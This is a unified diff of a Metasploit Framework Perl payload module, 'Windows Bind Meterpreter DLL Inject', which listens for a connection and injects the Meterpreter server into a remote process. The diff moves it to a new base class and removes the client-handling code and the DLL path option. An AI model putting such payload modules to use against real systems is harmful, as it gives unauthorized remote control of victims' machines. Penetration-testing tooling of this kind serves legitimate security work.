@@ -9,87 +9,35 @@
 
 package Msf::Payload::win32_bind_meterpreter;
 use strict;
-use base 'Msf::PayloadComponent::Win32InjectLibStage';
+use base 'Msf::PayloadComponent::Windows::ia32::InjectMeterpreterStage';
 use FindBin qw{$RealBin};
-use Pex::Meterpreter::Client;
-
-sub _Load {
-  Msf::PayloadComponent::Win32InjectLibStage->_Import('Msf::PayloadComponent::Win32BindStager');
-  __PACKAGE__->SUPER::_Load();
-}
 
 my $info =
 {
-  'Name'         => 'Windows Bind Meterpreter DLL Inject',
-  'Version'      => '$Revision$',
-  'Description'  => 'Listen for connection and inject the meterpreter server into the remote process',
-  'Authors'      => [
-                        'skape <mmiller [at] hick.org>',
-                    ],
-  'UserOpts'     => { 
-                        'METDLL'  => [1, 'PATH', 'The full path the meterpreter server dll', "$RealBin/data/meterpreter/metsrv.dll"],
-                    },
-                
+	'Name'         => 'Windows Bind Meterpreter DLL Inject',
+	'Version'      => '$Revision$',
+	'Description'  => 'Listen for connection and inject the meterpreter server into the remote process',
 };
+
+sub _Load 
+{
+	Msf::PayloadComponent::Windows::ia32::InjectMeterpreterStage->_Import('Msf::PayloadComponent::Windows::ia32::BindStager');
+
+	__PACKAGE__->SUPER::_Load();
+}
 
 sub new 
 {
-	_Load();
 	my $class = shift;
 	my $hash = @_ ? shift : { };
+	my $self;
+
+	_Load();
+
 	$hash = $class->MergeHashRec($hash, {'Info' => $info});
-	my $self = $class->SUPER::new($hash, @_);
+	$self = $class->SUPER::new($hash, @_);
+
 	return($self);
-}
-
-sub _InjectDLL 
-{
-	my $self = shift;
-
-	return $self->GetVar('METDLL');
-}
-
-sub _InjectDLLName
-{
-	my $self = shift;
-
-	return "metsrv.dll";
-}
-
-
-sub HandleConnection 
-{
-	my $self = shift;
-	my $sock = $self->PipeRemoteOut;
-
-	$self->SUPER::HandleConnection;
-	sleep(1);
-
-	# Start the meterpreter client
-	my $client = Pex::Meterpreter::Client->new(
-			consoleIn  => $self->PipeLocalIn,
-	 		consoleOut => $self->PipeLocalOut,
-			socketIn   => $self->PipeRemoteIn,
-			socketOut  => $self->PipeRemoteOut);
-
-	# Did it succeed?
-	if (not defined($client))
-	{
-		$self->PrintLine("[*] Could not create meterpreter client instance.");
-		$self->KillChild();
-
-		return;
-	}
-
-	# Run it.
-	$client->run();
-
-	$self->PrintLine("[*] Meterpreter client finished.");
-
-	$sock->close();
-	$self->KillChild();
-
-	return;
 }
 
 1;
